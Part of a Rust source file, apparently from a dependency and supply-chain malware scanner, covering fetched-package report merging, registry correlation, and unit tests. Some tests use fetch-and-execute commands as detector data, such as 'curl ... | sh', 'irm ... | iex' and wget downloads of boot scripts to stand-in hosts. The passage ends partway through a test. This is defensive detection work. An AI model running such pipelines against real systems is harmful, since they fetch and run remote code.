    // Rewritten across the whole subtree, not just its root, so members stay
    // attached to it — the appendix and every other per-path lookup walk a
    // "<root>!!" prefix. Merged report only: the standalone report captured for
    // hopper was taken before this and keeps cleave's own naming.
    let old_root = sub
        .files
        .iter()
        .find(|f| f.parent_id.is_none())
        .map(|f| f.path.clone());
    let rename = old_root
        .filter(|old| !old.is_empty() && !rec.locator.is_empty())
        .map(|old| (format!("{old}!!"), old, rec.locator.clone()));

    let first_new = report.files.len();
    for mut file in sub.files {
        // The payload's own top node (the sub-report's root) is a fetched edge:
        // pulled from `via`, not contained in its parent. Its exploded members
        // stay ordinary members.
        let is_sub_root = file.parent_id.is_none();
        file.id += id_base;
        file.parent_id = Some(file.parent_id.map_or(parent_id, |p| p + id_base));
        file.depth += parent_depth + 1;
        if let Some((old_prefix, old, locator)) = &rename {
            if file.path == *old {
                file.path.clone_from(locator);
            } else if let Some(rest) = file.path.strip_prefix(old_prefix.as_str()) {
                file.path = format!("{locator}!!{rest}");
            }
        }
        if is_sub_root {
            file.rel = cleave::types::Rel::Fetched;
            file.via = via.clone();
        }
        graft.push(report, file);
    }

    // If the payload was an archive, its members' facts (declared deps, npm
    // hooks) are the next hop too — the bytes hunt above only saw the container.
    // The payload's own node is skipped; the bytes hunt already covered it.
    for file in &report.files[first_new..] {
        if file.sha256 == analyzed.content_sha {
            continue;
        }
        if let Some(view) = &file.filefacts {
            let mut refs = find::references_from_facts(&view.values, &view.references);
            if is_ci_context(file) {
                for reference in &mut refs {
                    let context = reference
                        .context
                        .get_or_insert(filefacts::DependencyContext {
                            scope: filefacts::DependencyScope::Ci,
                            optional: false,
                            has_install_script: false,
                            installed_path: None,
                        });
                    context.scope = filefacts::DependencyScope::Ci;
                }
            }
            if !refs.is_empty() {
                next.push((file.sha256.clone(), refs));
            }
        }
    }
    next
}

/// Run the package-scoped composite pass for one fetched artifact, grafting any
/// composite that correlates its bytes with its registry metadata onto the
/// artifact node. A `scope: package` (or `scope: outer`) rule can thus fire on,
/// say, "deprecated on the registry **and** ships a native addon" even though
/// the artifact and the registry document were analyzed as separate reports and
/// never share an archive. The grafted composite carries its members in
/// `trait_refs`, so the later `strip_unmatched_traits` keeps the registry
/// building-block traits it fired on. A no-op when either side is empty.
fn apply_package_composites(
    report: &mut AnalysisReport,
    artifact_sha: &str,
    artifact_findings: &[Finding],
    registry_findings: &[Finding],
    opts: &AnalysisOptions,
) {
    match cleave::graft_package_composites(
        report,
        artifact_sha,
        artifact_findings,
        registry_findings,
        opts,
    ) {
        Ok(0) => {}
        // Per-package and routine on any registry-metadata scan: one line per
        // artifact drowns a worker's log. The grafted composites themselves
        // show up in the report, which is where they matter.
        Ok(n) => tracing::debug!(
            grafted = n,
            "package-scoped composites fired across artifact and registry metadata"
        ),
        Err(e) => tracing::warn!("package composite pass failed: {e:#}"),
    }
}

/// Enrich a fetched dependency's standalone report with package-scoped
/// registry composites before it is captured or merged into its parent.
fn prepare_dependency_report(
    payload: &mut Analyzed,
    registry_findings: Option<&[Finding]>,
    opts: &AnalysisOptions,
) {
    prepare_dependency_report_with(payload, registry_findings, opts, apply_package_composites);
}

/// Return the registry findings paired with the original declared reference.
/// A fetch may canonicalize a versionless/ranged PURL to the concrete version
/// it downloaded, so joining on `FetchRecord::locator` loses exactly the
/// registry transitions (including security holders) this pass must correlate.
fn registry_findings_for_reference<'a>(
    findings: &'a HashMap<String, Vec<Finding>>,
    reference: &Reference,
) -> Option<&'a [Finding]> {
    findings.get(locator(reference)).map(Vec::as_slice)
}

/// Injectable core of [`prepare_dependency_report`]. Keeping the mutation in a
/// small function makes the ordering contract testable without network access
/// or depending on the machine's installed trait bundle.
fn prepare_dependency_report_with(
    payload: &mut Analyzed,
    registry_findings: Option<&[Finding]>,
    opts: &AnalysisOptions,
    graft: impl FnOnce(&mut AnalysisReport, &str, &[Finding], &[Finding], &AnalysisOptions),
) {
    let Some(registry) = registry_findings else {
        return;
    };
    let artifact = payload.sub.as_ref().map(sub_findings).unwrap_or_default();
    let artifact_sha = payload.content_sha.clone();
    let Some(sub) = payload.sub.as_mut() else {
        return;
    };
    graft(sub, &artifact_sha, &artifact, registry, opts);
}

/// The URL a fetch's bytes came from: where the redirects ended, else where
/// the locator resolved. `None` when it never reached one.
pub(crate) fn fetched_url(rec: &FetchRecord) -> Option<&str> {
    rec.final_url.as_deref().or(rec.resolved_url.as_deref())
}

/// A filename for a fetched payload: the final URL's basename, else the
/// content hash. Drives cleave's extension-based type detection.
fn payload_name(rec: &FetchRecord) -> String {
    fetched_url(rec)
        .and_then(|url| url.rsplit('/').next())
        .and_then(|s| s.split(['?', '#']).next())
        .filter(|s| !s.is_empty())
        .map(str::to_string)
        .or_else(|| rec.content_sha256.clone())
        .unwrap_or_else(|| "fetched".to_string())
}

#[cfg(test)]
mod tests {
    use super::*;
    use fletch::RefKind;

    fn dropper(url: &str) -> bool {
        Url::parse(url).is_ok_and(|u| looks_like_dropper_download_url(&u))
    }

    fn valid_host(url: &str) -> bool {
        Url::parse(url).is_ok_and(|u| valid_discovered_url_host(&u))
    }

    #[test]
    fn manifest_relpath_leads_with_the_scanned_artifact() {
        // A plain manifest scanned directly shows just its basename.
        assert_eq!(manifest_relpath("/home/u/package.json"), "package.json");
        // A nested manifest reads as a file inside the scanned archive.
        assert_eq!(
            manifest_relpath("/tmp/demo.zip!!vexium-1.0.tgz!!package/package.json"),
            "demo.zip/vexium-1.0.tgz/package/package.json"
        );
        assert_eq!(
            manifest_relpath("demo.zip!!requirements.txt"),
            "demo.zip/requirements.txt"
        );
    }

    #[test]
    fn dep_pulled_covers_removed_yank_and_hold() {
        let base = Registry::default();
        assert!(!dep_pulled(&base));
        assert!(dep_pulled(&Registry {
            version_removed: Some(true),
            ..Registry::default()
        }));
        assert!(dep_pulled(&Registry {
            security_hold: Some(true),
            ..Registry::default()
        }));
        // pypi/crates record a yank as a `deprecated` reason, never `version_removed`.
        assert!(dep_pulled(&Registry {
            deprecated: Some("Yanked: critical CVE".to_string()),
            ..Registry::default()
        }));
        // An ordinary deprecation notice is not a withdrawal.
        assert!(!dep_pulled(&Registry {
            deprecated: Some("use v2 instead".to_string()),
            ..Registry::default()
        }));
    }

    fn test_finding(id: &str, crit: cleave::Criticality) -> Finding {
        let mut finding = Finding::new(
            id.to_string(),
            cleave::types::FindingKind::Capability,
            id.to_string(),
            1.0,
        );
        finding.crit = crit;
        finding
    }

    fn fetched_payload_with_finding(id: &str) -> Analyzed {
        let mut report: AnalysisReport = serde_json::from_value(serde_json::json!({
            "version": "3",
            "files": [{
                "id": 0,
                "path": "holder.tgz",
                "depth": 0,
                "file_type": "npm",
                "sha256": "d".repeat(64),
                "size": 399u64
            }]
        }))
        .expect("dependency report");
        report.files[0]
            .findings
            .push(test_finding(id, cleave::Criticality::Notable));
        Analyzed {
            sub: Some(report),
            content_sha: "d".repeat(64),
            next_from_bytes: Vec::new(),
            corpus: None,
        }
    }

    fn fetched_record() -> FetchRecord {
        FetchRecord {
            source_sha256: Some("s".repeat(64)),
            context: None,
            coverage_note: None,
            source_offset: Some(17),
            kind: RefKind::Dependency,
            locator: "pkg:npm/held@0.0.1-security".to_string(),
            resolved_url: Some("https://registry.test/held-0.0.1-security.tgz".to_string()),
            final_url: None,
            redirects: Vec::new(),
            status: Some(200),
            headers: Vec::new(),
            fetched_at: None,
            content_sha256: Some("d".repeat(64)),
            size: Some(399),
            served: Some(Served::Cache),
            pin_verified: None,
            outcome: Outcome::Ok,
        }
    }

    /// Regression for the fetched-package ordering bug: registry/package
    /// composites used to be grafted only after `capture_dependency` consumed
    /// its snapshot, so Hopper graded the dependency as clean and the parent
    /// never received a dependency-verdict back-reference.
    #[test]
    fn registry_composite_reaches_standalone_capture_and_merged_dependency() {
        let mut payload = fetched_payload_with_finding("artifact/seed");
        let registry = vec![test_finding(
            "metadata/registry::registry-security-hold-record",
            cleave::Criticality::Suspicious,
        )];
        let expected_composite =
            "objectives/supply-chain::registry-security-withdrawn-package-coordinate";

        prepare_dependency_report_with(
            &mut payload,
            Some(&registry),
            &AnalysisOptions::default(),
            |report, artifact_sha, artifact, registry, _opts| {
                assert_eq!(artifact_sha, "d".repeat(64));
                assert!(artifact.iter().any(|f| f.id == "artifact/seed"));
                assert!(
                    registry
                        .iter()
                        .any(|f| { f.id == "metadata/registry::registry-security-hold-record" })
                );
                report
                    .files
                    .iter_mut()
                    .find(|file| file.sha256 == artifact_sha)
                    .expect("artifact node")
                    .findings
                    .push(test_finding(
                        expected_composite,
                        cleave::Criticality::Hostile,
                    ));
            },
        );

        let rec = fetched_record();
        let captured = capture_dependency(&rec, &payload).expect("standalone capture");
        let captured: cleave::types::CompactReport =
            serde_json::from_str(&captured.raw).expect("captured report parses");
        assert!(
            captured.files[0]
                .findings
                .iter()
                .any(|f| f.id == expected_composite && f.criticality == 5),
            "the standalone report graded for Hopper must contain the hostile registry composite"
        );

        let mut parent: AnalysisReport = serde_json::from_value(serde_json::json!({
            "version": "3",
            "files": [{
                "id": 0,
                "path": "package.json",
                "depth": 0,
                "file_type": "package_json",
                "sha256": "s".repeat(64),
                "size": 100u64
            }]
        }))
        .expect("parent report");
        let mut graft = Graft::new(&parent);
        merge_payload(&mut parent, &mut graft, &rec, payload);
        let fetched = parent
            .files
            .iter()
            .find(|file| file.sha256 == "d".repeat(64))
            .expect("merged dependency root");
        assert_eq!(fetched.rel, cleave::types::Rel::Fetched);
        assert!(
            fetched
                .findings
                .iter()
                .any(|f| f.id == expected_composite && f.crit == cleave::Criticality::Hostile),
            "the embedded-file grader must see the same hostile registry composite"
        );
    }

    /// Registry correlation is opt-in per fetched edge. A dependency without a
    /// registry record must be captured unchanged and must not invoke the
    /// package-composite pass with unrelated metadata.
    #[test]
    fn missing_registry_does_not_mutate_fetched_dependency() {
        let mut payload = fetched_payload_with_finding("artifact/seed");
        prepare_dependency_report_with(
            &mut payload,
            None,
            &AnalysisOptions::default(),
            |_report, _sha, _artifact, _registry, _opts| {
                panic!("package composite pass must not run without matching registry metadata")
            },
        );

        let captured = capture_dependency(&fetched_record(), &payload).expect("capture");
        let captured: cleave::types::CompactReport =
            serde_json::from_str(&captured.raw).expect("captured report parses");
        assert_eq!(captured.files[0].findings.len(), 1);
        assert_eq!(captured.files[0].findings[0].id, "artifact/seed");
    }

    /// npm resolves a versionless or ranged declaration to a concrete holder
    /// release. Registry metadata remains keyed by the declaration; the fetch
    /// record carries the resolved coordinate. The package pass must join on
    /// the former or a security-holder transition disappears.
    #[test]
    fn registry_join_survives_versionless_purl_resolution() {
        let mut declared = Reference::new(
            RefLocator::Purl("pkg:npm/held".to_string()),
            RefKind::Dependency,
            "package.json",
            "held",
        );
        declared.offset = Some(17);
        let fetched = fetched_record();
        assert_eq!(fetched.locator, "pkg:npm/held@0.0.1-security");
        assert_ne!(locator(&declared), fetched.locator);

        let mut by_declared_locator = HashMap::new();
        by_declared_locator.insert(
            locator(&declared).to_owned(),
            vec![test_finding(
                "metadata/registry::registry-security-hold-record",
                cleave::Criticality::Suspicious,
            )],
        );
        let paired = registry_findings_for_reference(&by_declared_locator, &declared)
            .expect("versionless declaration retains its registry sidecar");
        assert_eq!(paired.len(), 1);
        assert_eq!(
            paired[0].id,
            "metadata/registry::registry-security-hold-record"
        );
        assert!(
            !by_declared_locator.contains_key(&fetched.locator),
            "control: joining on the resolved fetch locator would drop the sidecar"
        );
    }

    #[test]
    fn summary_line_omits_zero_counts() {
        let record = |outcome: Outcome, served: Served, size: Option<u64>| FetchRecord {
            source_sha256: None,
            context: None,
            coverage_note: None,
            source_offset: None,
            kind: RefKind::Dependency,
            locator: "pkg:npm/x".to_string(),
            resolved_url: None,
            final_url: None,
            redirects: Vec::new(),
            status: None,
            headers: Vec::new(),
            fetched_at: None,
            content_sha256: None,
            size,
            served: Some(served),
            pin_verified: None,
            outcome,
        };
        // Two cache hits, nothing live: the `0 live` is dropped, bytes stay.
        let warm = vec![
            record(Outcome::Ok, Served::Cache, Some(512)),
            record(Outcome::Ok, Served::Cache, Some(512)),
        ];
        let line = summary_line(&warm);
        assert!(line.contains("2 cached"), "{line}");
        assert!(
            !line.contains("live"),
            "zero `live` must be omitted: {line}"
        );
        // A mixed run keeps both non-zero counts.
        let mixed = vec![
            record(Outcome::Ok, Served::Network, Some(0)),
            record(Outcome::Ok, Served::Cache, Some(0)),
        ];
        let line = summary_line(&mixed);
        assert!(line.contains("1 live"), "{line}");
        assert!(line.contains("1 cached"), "{line}");
    }

    #[test]
    fn unresolved_fetches_stay_out_of_the_terminal_view() {
        let mut rec = fetched_record();
        rec.outcome = Outcome::Unresolved(fletch::fetch::Unresolved::NoRelease);

        assert!(!terminal_fetch_row_visible(&rec));
        assert!(matches!(landed_state(&rec), DepState::Hidden));
        assert!(matches!(done_state(&rec), DepState::Hidden));

        rec.outcome = Outcome::Failed(FetchError::Transport("connection reset".to_string()));
        assert!(terminal_fetch_row_visible(&rec));
        assert!(matches!(done_state(&rec), DepState::Done { .. }));
    }

    /// Neither `Skipped` reaches the human view: a reference that was never a
    /// fetch target says nothing about the scanned artifact, and a corpus hit is
    /// bytes the fleet already judged. Both stay in the record and the log.
    #[test]
    fn skipped_fetches_stay_out_of_the_terminal_view() {
        let mut rec = fetched_record();
        rec.outcome = Outcome::Skipped;
        rec.content_sha256 = None;
        assert!(!terminal_fetch_row_visible(&rec));
        assert!(matches!(done_state(&rec), DepState::Hidden));

        // A corpus hit — the other `Skipped` — is equally quiet.
        rec.content_sha256 = Some("d".repeat(64));
        assert!(!terminal_fetch_row_visible(&rec));
        assert!(matches!(done_state(&rec), DepState::Hidden));
    }

    /// A 404 says the coordinate names nothing the registry carries — a fact
    /// about the manifest, not the artifact being scanned — and a big lockfile
    /// produces them by the dozen. A failure that should have worked stays.
    #[test]
    fn absent_artifacts_stay_out_of_the_terminal_view() {
        let mut rec = fetched_record();
        rec.outcome = Outcome::Failed(FetchError::Status(404));
        rec.status = Some(404);
        assert!(!terminal_fetch_row_visible(&rec));
        assert!(matches!(done_state(&rec), DepState::Hidden));

        rec.status = Some(503);
        assert!(terminal_fetch_row_visible(&rec));

        // Only the typed status says the artifact is absent; error text is
        // never parsed for one.
        rec.status = None;
        assert!(terminal_fetch_row_visible(&rec));

        rec.outcome = Outcome::Failed(FetchError::Transport("connection reset".to_string()));
        assert!(terminal_fetch_row_visible(&rec), "transport failure");
    }

    /// A dependency whose verdict came from the corpus is never analyzed, so it
    /// has no subtree to graft — but it must still appear in the tree, or the
    /// adopted verdict has nothing to hang on and the dependency reads as
    /// though it were never there.
    #[test]
    fn an_adopted_verdict_gives_its_dependency_a_node() {
        let parent = || -> AnalysisReport {
            serde_json::from_value(serde_json::json!({
                "version": "3",
                "files": [{
                    "id": 0, "path": "package.json", "depth": 0,
                    "file_type": "package_json", "sha256": "s".repeat(64), "size": 100u64
                }],
            }))
            .expect("parent report")
        };
        let mut rec = fetched_record();
        rec.locator = "pkg:npm/zaboodle@1.49".to_string();
        rec.source_sha256 = Some("s".repeat(64));
        rec.outcome = Outcome::Skipped;
        let verdict = crate::corpus_precheck::Verdict {
            fires_at: crate::model::Level::At(2),
            reason: None,
            findings: Vec::new(),
        };
        let analyzed = |corpus: Option<Verdict>| Analyzed {
            sub: None,
            content_sha: "d".repeat(64),
            next_from_bytes: Vec::new(),
            corpus,
        };

        let mut adopted = parent();
        let mut graft = Graft::new(&adopted);
        merge_payload(&mut adopted, &mut graft, &rec, analyzed(Some(verdict)));
        let node = adopted
            .files
            .iter()
            .find(|f| f.sha256 == "d".repeat(64))
            .expect("the adopted dependency is in the tree");
        assert_eq!(node.path, "pkg:npm/zaboodle@1.49", "named by its locator");
        assert_eq!(node.rel, cleave::types::Rel::Fetched);
        assert_eq!(
            node.parent_id,
            Some(0),
            "hangs off the file that declared it"
        );
        assert_eq!(node.depth, 1);

        // Nothing adopted (a rule-2 benign skip, or an ordinary empty payload)
        // adds nothing: there is no verdict for a node to carry.
        let mut bare = parent();
        let mut graft = Graft::new(&bare);
        merge_payload(&mut bare, &mut graft, &rec, analyzed(None));
        assert_eq!(bare.files.len(), 1);
    }

    /// Regression for the silent-skip bug: `UnverifiablePin` delivers bytes just
    /// as `Ok` and `PinMismatch` do. The "did we get bytes" gates are `matches!`,
    /// which the compiler does not check for exhaustiveness, so a new Outcome can
    /// slip through them and drop a fetched payload out of analysis unnoticed —
    /// precisely the payload whose pin could not be verified.
    #[test]
    fn an_unverifiable_pin_is_analyzed_and_tallied_like_any_delivered_bytes() {
        let mut rec = fetched_record();
        rec.outcome = Outcome::UnverifiablePin;

        assert!(delivered_bytes(&rec));
        assert!(matches!(landed_state(&rec), DepState::Analyzing));
        assert!(terminal_fetch_row_visible(&rec));

        // It must reach the run summary rather than vanish from the counts.
        let line = summary_line(std::slice::from_ref(&rec));
        assert!(line.contains("1 cached"), "{line}");

        // And read as its own row, distinct from a verified fetch and from the
        // harder `pin!` mismatch.
        assert_eq!(fetch_row(&rec).label, "pin?");
    }

    /// One dependency named by forty manifests fails identically forty times.
    /// The streamed log states each distinct outcome once; the tree, which
    /// already keys its rows by locator, and `Off`, which prints nothing, do
    /// not filter.
    #[test]
    fn the_streamed_log_states_each_distinct_row_once() {
        let stream = Reporter::Stream {
            external_dependencies: AtomicU32::new(0),
            external_urls: AtomicU32::new(0),
            budget_notice: AtomicBool::new(false),
            printed: std::sync::Mutex::new(HashSet::new()),
        };

        let mut rec = fetched_record();
        rec.outcome = Outcome::Failed(FetchError::Status(404));
        assert!(stream.claim_row(&rec), "the first row must print");
        assert!(!stream.claim_row(&rec), "a repeat of it must not");

        // A different outcome over the same target is a different fact.
        let mut other_outcome = rec.clone();
        other_outcome.outcome = Outcome::UnverifiablePin;
        assert!(stream.claim_row(&other_outcome));

        // So is the same outcome over a different target.
        let mut other_target = rec.clone();
        other_target.resolved_url = Some("https://registry.test/other-1.0.0.tgz".to_string());
        assert!(stream.claim_row(&other_target));

        // A record that never resolved is keyed by its locator instead, so two
        // unresolved locators do not collapse into one row.
        let mut bare = rec.clone();
        bare.resolved_url = None;
        assert!(stream.claim_row(&bare));
        assert!(!stream.claim_row(&bare));

        assert!(Reporter::Off.claim_row(&rec));
        assert!(Reporter::Off.claim_row(&rec));
    }

    #[test]
    fn budget_notice_names_the_limiting_count_flag() {
        assert_eq!(
            fetch_count_budget_notice("--fetch-max-urls", 4, usize::MAX),
            "Skipping remaining fetches, hit fetch budget (--fetch-max-urls=4)"
        );
        assert_eq!(
            fetch_count_budget_notice("--fetch-max-file-fetches", 100, 7),
            "Skipping remaining fetches, hit fetch budget (--fetch-max-total-fetches=7)"
        );
    }

    #[test]
    fn go_pseudo_versions_date_themselves_without_a_lookup() {
        // Fixed points spanning the civil-days arithmetic: the epoch itself, a
        // century/leap-rule boundary, a leap day, and both year edges. These
        // catch an off-by-one era or an early month roll, which self-consistent
        // round-tripping would not.
        for (stamp, want) in [
            ("19700101000000", 0),
            ("20000101000000", 946_684_800), // 2000-01-01, leap-century
            ("20240229120000", 1_709_208_000), // leap day
            ("20251231235959", 1_767_225_599), // last second of a year
            ("20260101000000", 1_767_225_600), // first second of the next
        ] {
            assert_eq!(
                go_pseudo_version_published(&format!("pkg:golang/x/y@v0.0.0-{stamp}-abc")),
                Some(want),
                "{stamp}"
            );
        }

        // Real coordinates from the benchmark corpus, in both spellings the Go
        // proxy mints: the bare `v0.0.0-` form and the `vX.Y.Z-0.` form that
        // follows a release tag.
        assert_eq!(
            go_pseudo_version_published(
                "pkg:golang/github.com/deckhouse/deckhouse@v0.0.0-20260528132821-f66b8cdce5b3"
            ),
            Some(1_779_974_901),
        );
        assert_eq!(
            go_pseudo_version_published(
                "pkg:golang/cloud.google.com/go@v0.20.1-0.20260528200609-1134b3699ee5"
            ),
            Some(1_779_998_769),
        );
        // A module path containing digits and dots must not confuse the stamp
        // hunt, and neither must a 14-digit-looking commit hash prefix.
        assert_eq!(
            go_pseudo_version_published(
                "pkg:golang/gopkg.in/yaml.v3@v0.0.0-20260720151329-12345678901234"
            ),
            Some(1_784_560_409),
        );

        // Anything not confidently datable falls through to the registry rather
        // than being guessed at — a wrong age here silently skips a fetch.
        for undatable in [
            "pkg:golang/github.com/stretchr/testify@v1.9.0", // tagged release
            "pkg:golang/x/y@v0.0.0-2026052813282-abc",       // 13 digits
            "pkg:golang/x/y@v0.0.0-202605281328210-abc",     // 15 digits
            "pkg:golang/x/y@v0.0.0-20261328132821-abc",      // month 13
            "pkg:golang/x/y@v0.0.0-20260028132821-abc",      // month 0
            "pkg:golang/x/y@v0.0.0-20260532132821-abc",      // day 32
            "pkg:golang/x/y@v0.0.0-20260500132821-abc",      // day 0
            "pkg:golang/x/y@v0.0.0-20260528243821-abc",      // hour 24
            "pkg:golang/x/y@v0.0.0-20260528136021-abc",      // minute 60
            "pkg:golang/x/y",                                // no version at all
            "pkg:cargo/serde@1.0.219",                       // wrong ecosystem
            "pkg:npm/axios@1.6.8",                           // wrong ecosystem
            "not-a-purl",
        ] {
            assert_eq!(
                go_pseudo_version_published(undatable),
                None,
                "{undatable} must not be dated locally"
            );
        }
    }

    #[test]
    fn go_pseudo_version_age_decides_the_gate_the_same_way_a_registry_would() {
        // The gate compares `now - published >= max_age`. Pin that the local date
        // drives the same decision the registry record would, on both sides of
        // the boundary — this is the behaviour, not just the parse.
        let published = go_pseudo_version_published(
            "pkg:golang/github.com/deckhouse/deckhouse@v0.0.0-20260528132821-f66b8cdce5b3",
        )
        .expect("datable");
        let week = 7 * 86_400;

        // A month later: comfortably past a 7-day ceiling.
        let now = published + 30 * 86_400;
        assert!(now.saturating_sub(published) >= week);
        // A day later: inside the window, so it must still be fetched.
        let now = published + 86_400;
        assert!(now.saturating_sub(published) < week);
        // Exactly at the boundary counts as aged out, matching `age_secs >= max`.
        let now = published + week;
        assert!(now.saturating_sub(published) >= week);
        // A clock behind the stamp must not underflow into "ancient".
        let now = published - 86_400;
        assert_eq!(now.saturating_sub(published), 0);
    }

    #[test]
    fn resolved_purl_pairs_registry_version_onto_range_declarations() {
        let dep = |locator: &str| {
            Reference::new(
                RefLocator::Purl(locator.to_string()),
                RefKind::Dependency,
                "",
                "",
            )
        };
        let at = |v: &str| Registry {
            version: v.to_string(),
            ..Registry::default()
        };

        // The npm case this exists for: a manifest range leaves the locator
        // version-less, so the bloom (keyed `name@version`) could never match it.
        assert_eq!(
            resolved_purl(&dep("pkg:npm/axios"), &at("1.6.8")).as_deref(),
            Some("pkg:npm/axios@1.6.8")
        );
        // A scoped npm name percent-encodes its `@`, so the scope must not be
        // mistaken for a version already being present.
        assert_eq!(
            resolved_purl(&dep("pkg:npm/%40scope/pkg"), &at("2.0.0")).as_deref(),
            Some("pkg:npm/%40scope/pkg@2.0.0")
        );
        // Lockfile ecosystems already pin a version — returned untouched, and
        // notably NOT re-suffixed with the registry's version.
        assert_eq!(
            resolved_purl(&dep("pkg:cargo/serde@1.0.219"), &at("1.0.220")).as_deref(),
            Some("pkg:cargo/serde@1.0.219")
        );
        assert_eq!(
            resolved_purl(
                &dep("pkg:golang/github.com/stretchr/testify@v1.9.0"),
                &at("v1.9.1")
            )
            .as_deref(),
            Some("pkg:golang/github.com/stretchr/testify@v1.9.0")
        );
        // Nothing resolved, or not a PURL: no coordinate to probe.
        assert_eq!(resolved_purl(&dep("pkg:npm/axios"), &at("")), None);
        assert_eq!(
            resolved_purl(
                &Reference::new(
                    RefLocator::Url("https://example.test/x.tgz".into()),
                    RefKind::UrlFetch,
                    "",
                    "",
                ),
                &at("1.0.0")
            ),
            None
        );
    }

    #[test]
    fn freshly_published_and_must_rescan_track_publish_age() {
        let now = 1_000_000_u64;
        let fresh = Registry {
            published_at: Some(now - 3_600), // 1h ago
            ..Registry::default()
        };
        // 30h ago: outside the 4h window, and the case that separates it from
        // the local-file window in `engine`, which is still measured in days.
        let day_and_a_half = Registry {
            published_at: Some(now - 30 * 3_600),
            ..Registry::default()
        };
        let stale = Registry {
            published_at: Some(now - 300_000), // ~3.5d ago
            ..Registry::default()
        };
        assert!(freshly_published(&fresh, now));
        assert!(!freshly_published(&day_and_a_half, now));
        assert!(!freshly_published(&stale, now));
        // A settled, unwithdrawn version needs no re-scan; a just-published one
        // does, and a withdrawn one always does regardless of age.
        assert!(!must_rescan(&stale, now));
        assert!(!must_rescan(&day_and_a_half, now));
        assert!(must_rescan(&fresh, now));
        // A yank leaves the artifact downloadable, so re-scanning it is not a
        // doomed fetch — this is the arm that earns `dep_pulled` its keep.
        assert!(must_rescan(
            &Registry {
                published_at: Some(now - 300_000),
                deprecated: Some("yanked".to_string()),
                ..Registry::default()
            },
            now
        ));
        assert!(must_rescan(
            &Registry {
                published_at: Some(now - 300_000),
                security_hold: Some(true),
                ..Registry::default()
            },
            now
        ));
        assert!(must_rescan(
            &Registry {
                published_at: Some(now - 300_000),
                version_removed: Some(true),
                ..Registry::default()
            },
            now
        ));
    }

    fn url_ref(url: &str) -> Reference {
        Reference::new(
            RefLocator::Url(url.to_string()),
            RefKind::UrlFetch,
            "test",
            url,
        )
    }

    fn purl_ref(purl: &str) -> Reference {
        Reference::new(
            RefLocator::Purl(purl.to_string()),
            RefKind::Dependency,
            "test",
            purl,
        )
    }

    #[test]
    fn discovered_url_filter_keeps_download_shapes_and_drops_sites_and_endpoints() {
        for url in [
            "https://downloads.example.test/stage-2.sh",
            "https://cdn.example.test/releases/download/v1/payload",
            "https://api.telegram.org/file/bot123/documents/payload.exe",
            "https://huggingface.co/o/m/resolve/main/payload.bin",
            "https://example.test/archive/payload.tar.gz?sig=abc",
            "https://example.test/payload.js",
        ] {
            assert!(dropper(url), "download-shaped URL was rejected: {url}");
        }

        for url in [
            "https://example.test",
            "https://example.test/",
            "https://example.test/docs/",
            "https://example.test/download",
            "https://example.test/download?file=stage.sh",
            "https://api.example.test/v1/models",
            "https://example.test/api/v1/query",
            "https://example.test/graphql",
            "https://example.test/index.html",
            "https://example.test/result.json",
            "https://example.test/submit.php?id=1",
            "https://example.test/download/index.html",
            "https://example.test/file%2Ezip",
            "ftp://example.test/stage-2.sh",
            // A trailing `/` names a directory; the response is an index or a
            // landing page. This is the shape that pulled PyPI project pages.
            "https://pypi.org/project/diffusers/0.40.0/",
            "https://example.test/releases/v1.2.3/",
            // A version is not a filename, with or without the trailing slash.
            "https://pypi.org/project/diffusers/0.40.0",
            "https://github.com/foo/bar/releases/tag/v1.2.3",
            "https://api.example.test/v2.1",
            "https://example.test/lib/1.2.3/",
            "https://example.test/pkg/2.0.0",
        ] {
            assert!(!dropper(url), "site/API-shaped URL was kept: {url}");
        }
    }

    #[test]
    fn eval_pipeline_urls_are_followed_even_without_a_filename() {
        let mut reference = url_ref("https://cdn.jsdelivr.net/gh/example/stage-opaque");
        reference.evidence = "irm cdn.jsdelivr.net/gh/example/stage-opaque | iex".to_string();
        assert!(!dropper("https://cdn.jsdelivr.net/gh/example/stage-opaque"));
        assert!(is_eval_pipeline_url(&reference));

        reference.evidence = "curl jsonkeeper.com/abc123 | iex".to_string();
        assert!(is_eval_pipeline_url(&reference));

        reference.evidence = "curl jsonkeeper.com/abc123 | sh".to_string();
        assert!(is_eval_pipeline_url(&reference));

        reference.evidence = "wget cdn.jsdelivr.net/gh/example/stage | bash".to_string();
        assert!(is_eval_pipeline_url(&reference));

        reference.evidence =
            "curl --ssl-no-revoke -L https://example.test/opaque | cmd".to_string();
        assert!(is_eval_pipeline_url(&reference));

        reference.evidence = "iwr https://example.test/opaque | powershell -".to_string();
        assert!(is_eval_pipeline_url(&reference));

        reference.evidence = "curl https://example.test/stage-opaque".to_string();
        assert!(!is_eval_pipeline_url(&reference));
    }

    #[test]
    fn download_to_file_urls_are_followed_even_from_an_api_route() {
        let url = "https://example.vercel.app/api/settings/bootstrap";
        assert!(!dropper(url));
        let mut reference = url_ref(url);
        for evidence in [
            r#"wget -q -O "$DIR/boot.sh" "https://example.vercel.app/api/settings/bootstrap""#,
            r#"curl -s -L -o "$HOME/.vscode/boot.sh" "https://example.vercel.app/api/settings/bootstrap""#,
            "curl -sLo boot.sh https://example.vercel.app/api/settings/bootstrap",
            "curl --output=boot.sh https://example.vercel.app/api/settings/bootstrap",
            "curl -O https://example.vercel.app/api/settings/bootstrap",
            "Invoke-WebRequest -Uri https://example.vercel.app/api/settings/bootstrap -OutFile b.cmd",
        ] {
            reference.evidence = evidence.to_string();
            assert!(is_download_to_file_url(&reference), "{evidence}");
        }
        for evidence in [
            "wget -qO- https://example.vercel.app/api/settings/bootstrap",
            "curl -o - https://example.vercel.app/api/settings/bootstrap",
            "curl -s https://example.vercel.app/api/settings/bootstrap && unzip -o x.zip",
            "echo -o https://example.vercel.app/api/settings/bootstrap",
        ] {
            reference.evidence = evidence.to_string();
            assert!(!is_download_to_file_url(&reference), "{evidence}");
        }
    }

    #[test]
    fn url_fetches_present_their_commands_client() {
        let mut reference = url_ref("https://example.test/stage");
        for (evidence, agent) in [
            (
                "curl.exe -sL https://example.test/stage | cmd",
                Some(CURL_USER_AGENT),
            ),
            (
                "wget -qO- 'https://example.test/stage' | sh",
                Some(WGET_USER_AGENT),
            ),
            (
                "irm https://example.test/stage | iex",
                Some(POWERSHELL_USER_AGENT),
            ),
            ("https://example.test/stage", None),
        ] {
            reference.evidence = evidence.to_string();
            assert_eq!(client_user_agent(&reference), agent, "{evidence}");
        }
        REDIRECT_DESTINATION_SOURCE.clone_into(&mut reference.source);
        assert_eq!(client_user_agent(&reference), Some(CURL_USER_AGENT));
        assert_eq!(client_user_agent(&purl_ref("pkg:npm/curl@1.0.0")), None);
    }

    #[test]
    fn redirect_pages_name_their_destination() {
        // A URL-shortener safety interstitial served in place of a 3xx.
